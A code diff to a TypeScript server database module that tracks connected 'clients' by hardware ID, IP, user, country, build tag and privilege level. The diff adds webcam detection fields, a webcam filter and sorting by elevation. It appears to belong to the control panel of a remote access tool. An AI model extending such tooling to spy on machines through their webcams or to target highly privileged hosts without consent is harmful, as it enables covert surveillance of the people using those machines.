@@ -221,8 +221,8 @@ export type OfflineStateUpdate = {
   disconnectDetail?: string;
 };
 
-const UPSERT_CLIENT_ROW_SQL = `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, build_tag, built_by_user_id, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, battery_percent, battery_charging, is_admin, elevation, permissions)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, ?)
+const UPSERT_CLIENT_ROW_SQL = `INSERT INTO clients (id, hwid, role, ip, host, os, arch, version, user, nickname, custom_tag, custom_tag_note, monitors, country, last_seen, online, ping_ms, build_tag, built_by_user_id, enrollment_status, public_key, key_fingerprint, cpu, gpu, ram, battery_percent, battery_charging, webcam_available, webcam_devices, is_admin, elevation, permissions)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(?, 0), ?, COALESCE(?, 0), ?, ?)
      ON CONFLICT(id) DO UPDATE SET
        hwid=COALESCE(excluded.hwid, clients.hwid),
        role=COALESCE(excluded.role, clients.role),
@@ -250,6 +250,8 @@ const UPSERT_CLIENT_ROW_SQL = `INSERT INTO clients (id, hwid, role, ip, host, os
        ram=COALESCE(excluded.ram, clients.ram),
        battery_percent=COALESCE(excluded.battery_percent, clients.battery_percent),
        battery_charging=COALESCE(excluded.battery_charging, clients.battery_charging),
+       webcam_available=COALESCE(excluded.webcam_available, clients.webcam_available),
+       webcam_devices=COALESCE(excluded.webcam_devices, clients.webcam_devices),
        is_admin=COALESCE(excluded.is_admin, clients.is_admin),
        elevation=COALESCE(excluded.elevation, clients.elevation),
        permissions=COALESCE(excluded.permissions, clients.permissions)
@@ -287,6 +289,8 @@ function upsertClientRowInternal(partial: ClientDbRow): void {
     partial.ram ?? null,
     partial.batteryPercent ?? null,
     partial.batteryCharging !== undefined && partial.batteryCharging !== null ? (partial.batteryCharging ? 1 : 0) : null,
+    partial.webcamAvailable !== undefined ? (partial.webcamAvailable ? 1 : 0) : null,
+    partial.webcamDevices ? JSON.stringify(partial.webcamDevices) : null,
     partial.isAdmin !== undefined ? (partial.isAdmin ? 1 : 0) : null,
     partial.elevation ?? null,
     partial.permissions ? JSON.stringify(partial.permissions) : null,
@@ -951,6 +955,7 @@ export function listClients(filters: ListFilters): ListResult {
     allowedClientIds,
     deniedClientIds,
     groupFilter,
+    webcamFilter,
   } = filters;
   const where: string[] = [];
   const params: any[] = [];
@@ -971,8 +976,12 @@ export function listClients(filters: ListFilters): ListResult {
   }
 
   if (osFilter && osFilter !== "all") {
-    where.push("c.os=?");
-    params.push(osFilter);
+    if (osFilter === "windows") {
+      where.push("LOWER(COALESCE(c.os, '')) LIKE 'windows%'");
+    } else {
+      where.push("c.os=?");
+      params.push(osFilter);
+    }
   }
 
   if (countryFilter && countryFilter !== "all") {
@@ -1015,6 +1024,17 @@ export function listClients(filters: ListFilters): ListResult {
     }
   }
 
+  const webcamAvailableSql =
+    "(COALESCE(c.webcam_available, 0)=1 OR (c.webcam_devices IS NOT NULL AND c.webcam_devices NOT IN ('', '[]', 'null')))";
+
+  if (webcamFilter && webcamFilter !== "all") {
+    if (webcamFilter === "available") {
+      where.push(webcamAvailableSql);
+    } else if (webcamFilter === "none") {
+      where.push(`NOT ${webcamAvailableSql}`);
+    }
+  }
+
   const whereSql = where.length ? `WHERE ${where.join(" AND ")}` : "";
   const needsGroupJoinForFilter =
     sort === "group_asc" ||
@@ -1041,6 +1061,8 @@ export function listClients(filters: ListFilters): ListResult {
         return `ORDER BY ${online}, ${bookmark}, LOWER(COALESCE(c.country, 'zz')) DESC, c.id ASC`;
       case "admin_first":
         return `ORDER BY ${online}, ${bookmark}, c.is_admin DESC, c.id ASC`;
+      case "elevated_first":
+        return `ORDER BY ${online}, ${bookmark}, CASE WHEN c.elevation IN ('trustedinstaller', 'system', 'admin', 'elevated') OR c.is_admin=1 THEN 1 ELSE 0 END DESC, CASE c.elevation WHEN 'trustedinstaller' THEN 4 WHEN 'system' THEN 3 WHEN 'admin' THEN 2 WHEN 'elevated' THEN 1 ELSE 0 END DESC, c.id ASC`;
       case "group_asc":
         return `ORDER BY ${online}, ${bookmark}, g.name IS NULL, LOWER(g.name) ASC, c.id ASC`;
       case "group_desc":
@@ -1053,7 +1075,7 @@ export function listClients(filters: ListFilters): ListResult {
   const offset = (page - 1) * pageSize;
 
   const clientFields =
-    "c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.battery_percent as batteryPercent, c.battery_charging as batteryCharging, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, c.notifications_muted as notificationsMuted, c.deny_reason as denyReason";
+    `c.id, c.hwid, c.role, c.ip, c.host, c.os, c.arch, c.version, c.user, c.nickname, c.custom_tag as customTag, c.custom_tag_note as customTagNote, c.monitors, c.country, c.last_seen as lastSeen, c.online, c.ping_ms as pingMs, c.bookmarked, c.build_tag as buildTag, c.built_by_user_id as builtByUserId, c.enrollment_status as enrollmentStatus, c.public_key as publicKey, c.key_fingerprint as keyFingerprint, c.cpu, c.gpu, c.ram, c.battery_percent as batteryPercent, c.battery_charging as batteryCharging, CASE WHEN ${webcamAvailableSql} THEN 1 ELSE 0 END as webcamAvailable, c.webcam_devices as webcamDevices, c.is_admin as isAdmin, c.elevation, c.permissions, c.disconnect_reason as disconnectReason, c.disconnect_detail as disconnectDetail, c.group_id as groupId, c.notifications_muted as notificationsMuted, c.deny_reason as denyReason`;
 
   let rows: any[] | undefined;
   let totalCount = 0;
@@ -1176,6 +1198,8 @@ export function listClients(filters: ListFilters): ListResult {
       ram: c.ram || null,
       batteryPercent: typeof c.batteryPercent === "number" ? c.batteryPercent : null,
       batteryCharging: c.batteryCharging === null || c.batteryCharging === undefined ? null : c.batteryCharging === 1,
+      webcamAvailable: c.webcamAvailable === 1,
+      webcamDevices: c.webcamDevices ? (() => { try { return JSON.parse(c.webcamDevices); } catch { return []; } })() : [],
       isAdmin: c.isAdmin === 1,
       elevation: c.elevation || null,
       permissions: c.permissions ? (() => { try { return JSON.parse(c.permissions); } catch { return null; } })() : null,
@@ -1588,6 +1612,21 @@ export function setClientNotificationsMuted(id: string, muted: boolean): boolean
     muted ? 1 : 0,
     id,
   );
+  return ((result as any)?.changes || 0) > 0;
+}
+
+export function setClientWebcamInfo(
+  id: string,
+  webcamAvailable: boolean,
+  webcamDevices: { index: number; name: string; maxFps?: number }[],
+): boolean {
+  const result = db.run(
+    `UPDATE clients SET webcam_available=?, webcam_devices=? WHERE id=?`,
+    webcamAvailable ? 1 : 0,
+    JSON.stringify(webcamDevices),
+    id,
+  );
+  if (((result as any)?.changes || 0) > 0) invalidateClientMetricsSummaryCache();
   return ((result as any)?.changes || 0) > 0;
 }
 
